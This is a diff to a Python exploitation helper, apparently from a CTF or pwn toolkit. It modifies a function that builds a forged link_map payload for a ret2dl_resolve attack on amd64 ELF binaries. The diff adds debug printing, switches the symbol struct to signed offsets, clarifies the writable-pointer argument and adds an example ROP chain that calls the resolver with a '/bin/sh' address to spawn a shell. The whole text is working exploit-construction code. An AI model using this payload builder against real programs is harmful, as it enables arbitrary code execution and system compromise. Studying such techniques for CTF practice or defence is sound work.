@@ -109,7 +109,7 @@ Returns:
 #   Elf64_Xword	st_size;		/* Symbol size */
 # } Elf64_Sym; // 0x18
 
-def amd64_offset(pointer_addr, addr_offset, ctrl_offset, ptr_writeable_offset):
+def amd64_offset(pointer_addr, addr_offset, ctrl_offset, ptr_writeable_offset, debug=False):
     """
 amd64_offset(pointer_addr, addr_offset, ctrl_offset, ptr_writeable_offset) -> bytes
 
@@ -120,14 +120,15 @@ Arguments:
     addr_offset: the offset between the target function and the pointer
     ctrl_offset: the offset between the start of controlable memory space 
         and the pointer_addr
-    ptr_writeable_offset: the offset between some writeable address and the pointer
-        (by pass write back in _dl_fixup)
+    ptr_writeable_offset: the offset between the pointer(not the address of the pointer!!!) and 
+        some writeable address (bypass write back in _dl_fixup)
 
 Returns:
     A: payload (write to (pointer_addr+ctrl_offset))
 
 Examples:
-    pf.ret2dl_resolve.amd64_offset(0x601028, 150608, 0x28, 0x3a38c0)
+    p1 = pf.ret2dl_resolve.amd64_offset(0x601028, 150608, 0x28, 0x3a38c0)
+    p2 = flat(padding, pop_rdi_ret, binsh_addr, plt_0+8, fake_linkmap_addr, 0, main)
     """
     if ctrl_offset > 0x68:
         puts("[amd64_offset] control offset is too big, try another pointer")
@@ -140,7 +141,11 @@ Examples:
         0xf8: pointer_addr + dynamic_entry_offset, # dynamic entry's addr for JMPREL
         dynamic_entry_offset: struct.pack("<QQ", 0, pointer_addr+dynamic_entry_offset+0x10),
         dynamic_entry_offset+0x10: struct.pack("<QQ", ptr_writeable_offset, (1 << 32) | 0x07), # Elf64_Rel 
-        dynamic_entry_offset+0x10+0x18: struct.pack('<IBBHQQ', 0, 0, 1, 0, addr_offset, 0), # Elf64_Sym
+        dynamic_entry_offset+0x10+0x18: struct.pack('<IBBHqq', 0, 0, 1, 0, addr_offset, 0), # Elf64_Sym
     }, filler='\0')[ctrl_offset:]
-
+    if debug:
+        print("link map : " + hex(pointer_addr))
+        print("strtab/symtab/jmprel : " + hex(pointer_addr + dynamic_entry_offset))
+        print("Elf64_Rel : " + hex(pointer_addr + dynamic_entry_offset + 0x10))
+        print("Elf64_Sym : " + hex(pointer_addr + dynamic_entry_offset + 0x28))
     return link_map
